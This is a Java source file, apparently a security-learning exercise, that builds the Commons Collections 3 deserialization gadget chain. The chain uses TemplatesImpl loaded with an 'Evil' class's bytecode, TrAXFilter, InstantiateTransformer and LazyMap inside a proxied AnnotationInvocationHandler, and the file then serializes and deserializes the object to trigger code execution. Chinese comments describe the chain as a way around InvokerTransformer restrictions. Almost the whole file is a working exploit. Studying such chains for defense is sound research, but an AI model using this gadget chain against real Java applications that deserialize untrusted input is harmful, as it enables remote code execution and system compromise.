package vuln;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import util.SerializeUtil;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * cc3的主要目的就是绕过一些限制,比如InvokerTransformer
 * 测试环境:
 * jdk7
 * cc3.1
 * **/
public class Commoncollections3 {
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        vulncc3();

    }

    /**调用链
     *
     * ObjectInputStream.readObject()
     * AnnotationInvocationHandler.readObject()
     *  (!!!通过动态代理)Map(Proxy).entrySet()
     * AnnotationInvocationHandler.invoke()
     * LazyMap.get()
     * ChainedTransformer.transform()
     * ConstantTransformer.transform()
     * InstantiateTransformer.transform()
     * TrAXFilter.()
     * TemplatesImpl.newTransformer()
     * ...
     * Runtime.exec()
     * **/
    public static void vulncc3() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NotFoundException, NoSuchFieldException, TransformerConfigurationException, CannotCompileException {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("util.Evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","aaa");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{ctClass.toBytecode()});
        ChainedTransformer fakechainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        //使用以下代码来完成对TrAXFilter构造函数的调用,简单点说就是前一个的输出作为后一个的输入
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, fakechainedTransformer);
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);
        Map invocation_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Target.class, invocation_map);
        Class<?> aClass1 = Class.forName("org.apache.commons.collections.map.LazyMap");
        SerializeUtil.setFieldValue(decorate,"factory",chainedTransformer);

        SerializeUtil.readObjectToByteArray(SerializeUtil.writeObjectToByteArray(o));
    }

}
